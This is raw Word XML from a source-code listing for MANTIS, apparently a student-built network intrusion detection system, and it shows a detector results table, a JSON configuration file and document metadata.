      </w:r>
    </w:p>
    <w:p w14:paraId="2E65314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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1F8C2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KNN             | Port scan        | PORT SCAN DETECTED"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0451034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Z-Score         | Max SYN flood    | DDoS DETECTED / Z-Score &gt; 3"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F74A0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Naive Bayes     | SQLi payload     | MALICIOUS PAYLOAD / UNION SELECT"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DEDD5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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DDDEF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  Offline test (no live sensor):  ./benchmark.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BFA8D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BBE970"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echo ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F7382A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4232923A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Configuration and Dependency Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29209549"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mantis.example.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620BDFAB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>26 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C908E4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50AEBD2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"packet_buffer": 5000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9BD4D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"queue_size": 100000,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27411B1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"zscore_window": 30,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BA0DA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"zscore_threshold": 3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AAFC5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"ddos_min_pps": 500,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459F5751"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"ddos_consecutive_intervals": 3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE5A3BB"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"knn_k": 3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C70696"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"kmeans_k": 3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E54978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"kmeans_alpha": 0.05,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4643F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"payload_confidence": 0.8,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A9B1A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"alert_dedup_seconds": 5.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7111D8A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"source_attribution_min_share": 0.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B0FE84"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"block_enabled": false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2521005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"block_whitelist": ["127.0.0.1", "0.0.0.0"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E17FDFF"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"block_on": ["payload", "blacklist", "ddos", "scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79781665"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"privacy_mode": true,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F001D2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"anonymise_ips": false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126B0968"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"payload_excerpt_bytes": 64,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F54A30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"udp_host": "127.0.0.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFE87D3"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"udp_port": 9999,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAD8C69"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"http_port": 8080,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF05B0E"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"pcap_snaplen": 96,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE209C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"brain_file": "data/mantis_brain.json",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109E853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xml:space="preserve">  "log_file": "mantis_logs.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C68777A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBC5285"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requirements.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B691EE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>2 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C093A97"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MANTIS uses the Python standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1919989C"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 No pip packages are required for the maintained runtime and tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060065C7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>VERSION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584D333F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>1 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B3DB52" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Consolas" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>1.0.0</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidSect="00034616">
      <w:headerReference w:type="default" r:id="rId8"/>
      <w:footerReference w:type="default" r:id="rId9"/>
      <w:pgSz w:w="11909" w:h="16834"/>
      <w:pgMar w:top="1037" w:right="1037" w:bottom="1037" w:left="1037"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61017" w14:textId="77777777" w:rsidR="00AC4A70" w:rsidRDefault="00AC4A70">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="666C8228" w14:textId="77777777" w:rsidR="00AC4A70" w:rsidRDefault="00AC4A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2AE34" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:instrText>PAGE</w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>1</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="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DDB2C" w14:textId="77777777" w:rsidR="00AC4A70" w:rsidRDefault="00AC4A70">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="66D7461C" w14:textId="77777777" w:rsidR="00AC4A70" w:rsidRDefault="00AC4A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45EEA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:eastAsia="Times New Roman"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>MANTIS Source Code Listings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0359169">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1426536781">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2069453795">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="669913187">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1133792499">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1660694607">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1473865440">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="613484997">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="423184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819AD"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AC4A70"/>
    <w:rsid w:val="00B45FE9"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00EA1A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AA26D0"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{8F72CA5F-EDA2-4DA1-8E0E-F286229CB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keepLines/>
      <w:widowControl w:val="0"/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="000000"/>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49495</Words>
  <Characters>282124</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>2351</Lines>
  <Paragraphs>661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MANTIS Source Code Listings</dc:title>
  <dc:subject>Executable source code submission</dc:subject>
  <dc:creator>Anuskar Sigdel</dc:creator>
  <cp:keywords>MANTIS, source code, 24812606</cp:keywords>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>Sigdel ANUSKAR</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-01T06:43:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>